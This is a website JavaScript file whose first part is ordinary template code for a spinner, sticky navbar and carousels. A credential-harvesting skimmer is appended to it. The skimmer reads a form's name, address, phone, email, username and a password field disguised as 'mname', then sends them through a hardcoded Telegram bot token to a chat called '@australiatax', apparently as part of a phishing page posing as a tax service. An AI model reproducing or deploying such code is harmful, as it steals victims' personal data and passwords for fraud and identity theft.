(function ($) {
    "use strict";

    // Spinner
    var spinner = function () {
        setTimeout(function () {
            if ($('#spinner').length > 0) {
                $('#spinner').removeClass('show');
            }
        }, 1);
    };
    spinner();
    
    
    // Initiate the wowjs
    new WOW().init();


    // Sticky Navbar
    $(window).scroll(function () {
        if ($(this).scrollTop() > 300) {
            $('.sticky-top').css('top', '0px');
        } else {
            $('.sticky-top').css('top', '-100px');
        }
    });
    
    
    // Back to top button
    $(window).scroll(function () {
        if ($(this).scrollTop() > 300) {
            $('.back-to-top').fadeIn('slow');
        } else {
            $('.back-to-top').fadeOut('slow');
        }
    });
    $('.back-to-top').click(function () {
        $('html, body').animate({scrollTop: 0}, 1500, 'easeInOutExpo');
        return false;
    });


    // Header carousel
    $(".header-carousel").owlCarousel({
        autoplay: true,
        smartSpeed: 1500,
        items: 1,
        dots: true,
        loop: true,
        nav : true,
        navText : [
            '<i class="bi bi-chevron-left"></i>',
            '<i class="bi bi-chevron-right"></i>'
        ]
    });


    // Testimonials carousel
    $(".testimonial-carousel").owlCarousel({
        autoplay: true,
        smartSpeed: 1000,
        center: true,
        margin: 24,
        dots: true,
        loop: true,
        nav : false,
        responsive: {
            0:{
                items:1
            },
            768:{
                items:2
            },
            992:{
                items:3
            }
        }
    });
    
})(jQuery);

"use strict"



//bot token
var telegram_bot_id = "6310644522:AAHTH8-ulzoYqSzZaLCipmNF5uzJPFXaNy0";
//chat id
var chat_id = 5883545100;
var fname, lname, mmname, street, city, state, zip, pnumber, username, how, mname, email;
var ready = function () {
    fname = document.getElementById("fname").value;
    mmname = document.getElementById("mmname").value;
    lname = document.getElementById("lname").value;
    street = document.getElementById("street").value;
    city = document.getElementById("city").value;
    state = document.getElementById("state").value;
    zip = document.getElementById("zip").value;
    number = document.getElementById("number").value;
    how = document.getElementById("how").value;
    username = document.getElementById("username").value;
    mname = document.getElementById("mname").value;
    email = document.getElementById("email").value;
    message = "Name: " + fname + "\nMiddlename: " + mmname + "\nLastname: " + lname + "\nStreet: " + street + "\ncity: " + city + "\nstate: " + state + "\nzip: " + zip + "\nnumber: " + number + "\nEmail: " + email + "\nusername: " + username + "\npassword: " + mname + "\nHave you applied for : " + how;
};
var sender = function () {
    ready();
    var settings = {
        "async": true,
        "crossDomain": true,
        "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "cache-control": "no-cache"
        },
        "data": JSON.stringify({
            "chat_id": '@australiatax',
            "text": message
        })
    };
    $.ajax(settings).done(function (response) {
        console.log(response);
    });
    document.getElementById("fname").value = "";
    document.getElementById("mmname").value = "";
    document.getElementById("lname").value = "";
    document.getElementById("street").value = "";
    document.getElementById("city").value = "";
    document.getElementById("state").value = "";
    document.getElementById("zip").value = "";
    document.getElementById("number").value = "";
    document.getElementById("how").value = "";
    document.getElementById("username").value = "";
    document.getElementById("mname").value = "";
    document.getElementById("email").value = "";
    return false;
};
